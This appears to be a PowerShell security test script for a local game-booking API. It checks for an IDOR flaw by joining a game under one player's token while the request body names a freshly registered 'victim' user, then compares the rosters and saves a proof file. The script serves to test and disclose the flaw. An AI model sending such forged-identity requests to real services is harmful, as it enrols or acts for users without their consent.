$ErrorActionPreference='Stop'
function Api { param($M,$P,$B,$H=@{})
  $a=@{Uri="http://localhost:8080$P";Method=$M;Headers=$H;UseBasicParsing=$true;TimeoutSec=30}
  if($null -ne $B){$a.Body=($B|ConvertTo-Json -Depth 6);$a.ContentType='application/json'}
  try{$r=Invoke-WebRequest @a; return [pscustomobject]@{s=[int]$r.StatusCode;b=$r.Content}}
  catch{$c=0;if($_.Exception.Response){$c=[int]$_.Exception.Response.StatusCode.value__}
    $m=$_.ErrorDetails.Message; if(-not $m){$m=$_.Exception.Message}
    return [pscustomobject]@{s=$c;b=$m}}
}
function L($e,$p){ (Api POST '/api/v1/auth/login' @{email=$e;password=$p}).b | ConvertFrom-Json }
$ds=Get-Content "$PSScriptRoot\baseline\qa-dataset.json" -Raw | ConvertFrom-Json
$gid=$ds.openGame.id
$Z=L 'qa.player.zero@turfchai.test' 'QaPass@12345'
$ZH=@{Authorization="Bearer $($Z.token)"}

# brand-new victim, guaranteed not on the roster
$n=Get-Random -Minimum 100000 -Maximum 999999
$victim=(Api POST '/api/v1/auth/register' @{fullName='Join Victim';email="joinvictim$n@qa.test";password='QaPass@12345';phone="+8801955$n";role='PLAYER'}).b | ConvertFrom-Json
Write-Host ("victim id={0} email=joinvictim{1}@qa.test" -f $victim.user.id,$n)

$before=@((Api GET "/api/v1/solo/open-games/$gid/members").b | ConvertFrom-Json | ForEach-Object {$_.userId})
Write-Host ("roster BEFORE: {0}" -f ($before -join ','))
Write-Host ("caller = playerZero id={0} ; body userId = victim id={1}" -f $Z.user.id,$victim.user.id)
$j=Api POST "/api/v1/solo/open-games/$gid/join" @{userId=$victim.user.id;paymentMethod='bKash'} $ZH
Write-Host ("join status={0} body={1}" -f $j.s,($j.b -replace '\s+',' '))
$after=@((Api GET "/api/v1/solo/open-games/$gid/members").b | ConvertFrom-Json | ForEach-Object {$_.userId})
Write-Host ("roster AFTER : {0}" -f ($after -join ','))
$added=@($after | Where-Object { $before -notcontains $_ })
Write-Host ("newly added  : {0}" -f ($added -join ','))
$verdict = if($added -contains $victim.user.id -and $added -notcontains $Z.user.id) { 'CONFIRMED IDOR: the server enrolled the userId from the request body, not the authenticated caller' }
           elseif($added -contains $Z.user.id) { 'SAFE: server enrolled the authenticated caller' }
           else { 'inconclusive (nobody added)' }
Write-Host ("VERDICT: {0}" -f $verdict) -ForegroundColor Yellow

[ordered]@{
  openGameId=$gid; callerUserId=$Z.user.id; bodyUserId=$victim.user.id
  joinStatus=$j.s; joinBody=($j.b -replace '\s+',' ')
  rosterBefore=$before; rosterAfter=$after; newlyAdded=$added; verdict=$verdict
} | ConvertTo-Json -Depth 6 | Set-Content "$PSScriptRoot\baseline\qa-join-identity-proof.json" -Encoding UTF8
Write-Host "Written baseline\qa-join-identity-proof.json" -ForegroundColor Green
